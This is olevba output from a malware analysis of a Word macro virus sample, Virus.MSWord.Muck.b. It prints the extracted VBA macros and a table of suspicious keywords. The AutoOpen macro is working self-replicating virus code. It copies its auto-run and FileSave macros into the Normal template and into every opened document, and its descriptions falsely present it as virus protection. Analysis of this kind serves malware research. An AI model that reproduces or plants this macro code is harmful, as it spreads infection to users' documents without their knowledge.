olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Muck.b-34f4e850726fd412e4aa00fe3c014c5d8c4c421c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Muck.b-34f4e850726fd412e4aa00fe3c014c5d8c4c421c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Muck.b-34f4e850726fd412e4aa00fe3c014c5d8c4c421c - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Wazzu Virus Protection.  Used to install the Autoexec macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoOpen.MAIN"
Dim ExecuteOnly
On Error Resume Next
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoOpen", "Global:AutoOpen", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoNew", "Global:AutoNew", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoExit", "Global:AutoExit", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSave", "Global:FileSave", ExecuteOnly
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileSaveAs", "Global:FileSaveAs", ExecuteOnly


WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[FileName$]() + ":AutoOpen", ExecuteOnly
WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose", ExecuteOnly
WordBasic.MacroCopy "Global:AutoNew", WordBasic.[FileName$]() + ":AutoNew", ExecuteOnly
WordBasic.MacroCopy "Global:AutoExit", WordBasic.[FileName$]() + ":AutoExit", ExecuteOnly
WordBasic.MacroCopy "Global:FileSave", WordBasic.[FileName$]() + ":FileSave", ExecuteOnly
WordBasic.MacroCopy "Global:FileSaveAs", WordBasic.[FileName$]() + ":FileSaveAs", ExecuteOnly
WordBasic.FileSaveAll 1
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Muck.b-34f4e850726fd412e4aa00fe3c014c5d8c4c421c - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Installed to your NORMAL template as AutoClose to clean the prank macros from any documents that you open then close."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoClose.MAIN"
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Muck.b-34f4e850726fd412e4aa00fe3c014c5d8c4c421c - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'**********************************
'   Macro:   AutoNew - PRMaster.dot
'**********************************

'***********
'  Sub: Main
'***********

Public Sub MAIN()
Attribute MAIN.VB_Description = "When creating a new document this macro shows the IMI toolbar, maximizes the document, and zooms to fit page width."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoNew.MAIN"
Dim username$
username$ = Space(255)
Dim user_settings_file$
Dim originator$
Dim xlpath$
Dim localdir$
Dim netdir$
Dim xl_logfile$
Dim shadowfile$
Dim PRNumberFile$
xlpath$ = Space(255)
localdir$ = Space(255)
netdir$ = Space(255)
xl_logfile$ = Space(255)
shadowfile$ = Space(255)
PRNumberFile$ = Space(255)
Dim TestOrLive$
Dim Temp_File$
Dim hdr$
Dim sup$
Dim orderlines$

On Error GoTo -1: On Error GoTo errortrap

WordBasic.ViewToolbars Toolbar:="Formatting", Hide:=1
WordBasic.ViewToolbars Toolbar:="Standard", Hide:=1
WordBasic.ViewToolbars Toolbar:="Borders", Hide:=1
WordBasic.ViewToolbars Toolbar:="Database", Hide:=1
WordBasic.ViewToolbars Toolbar:="Drawing", Hide:=1
WordBasic.ViewToolbars Toolbar:="Forms", Hide:=1
WordBasic.ViewToolbars Toolbar:="Macro", Hide:=1
WordBasic.ViewToolbars Toolbar:="Microsoft", Hide:=1
WordBasic.ViewToolbars Toolbar:="Toolbar 10 (PRMaster)", Show:=1
GoTo GoOn

'****************
LongTemplateName:
'****************

WordBasic.ViewToolbars Toolbar:="Toolbar 10 (PRMaster.dot)", Show:=1

'****
GoOn:
'****
WordBasic.ViewRuler 0

    'Read the settings file to find username, excel path etc

    Open "c:\prsystem\prsets.txt" For Input As 1
        Input #1, username$, user_settings_file$
    Close 1
    Open user_settings_file$ For Input As 1
    originator$ = ""
    While UCase(originator$) <> UCase(username$)
        Input #1, originator$, _
                xlpath$, _
                localdir$, _
                netdir$, _
                xl_logfile$, _
                shadowfile$, _
                PRNumberFile$, _
                TestOrLive$    'Test=T, Live=M
    Wend
    Close 1

    If WordBasic.[Right$](localdir$, 1) = "\" Then
        Temp_File$ = localdir$ + "pr_stat.txt"
    Else
        Temp_File$ = localdir$ + "\pr_stat.txt"
    End If

    WordBasic.Kill Temp_File$

    'Create the status record in file pr_stat.txt
    hdr$ = "Header_NotOK"
    sup$ = "SupplierDetails_NotOK"
    orderlines$ = "Orders_NotOK"
    Open Temp_File$ For Output As 1
    Write #1, hdr$, sup$, orderlines$
    Close 1
    GoTo EndOfIt

'*********
errortrap:
'*********

    Select Case Err.Number
    Case 24    'bad parameter
        Err.Number = 0
        GoTo ErrorReturn
    Case Else
        Error Err.Number
    End Select

'***********
ErrorReturn:
'***********

    End Select
    GoTo LongTemplateName

'*******
EndOfIt:
'*******

End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoExit.bas 
in file: Virus.MSWord.Muck.b-34f4e850726fd412e4aa00fe3c014c5d8c4c421c - OLE stream: 'Macros/VBA/AutoExit'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to protect and disinfect your Normal (Global) template."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoExit.MAIN"
End Sub
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Muck.b-34f4e850726fd412e4aa00fe3c014c5d8c4c421c - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

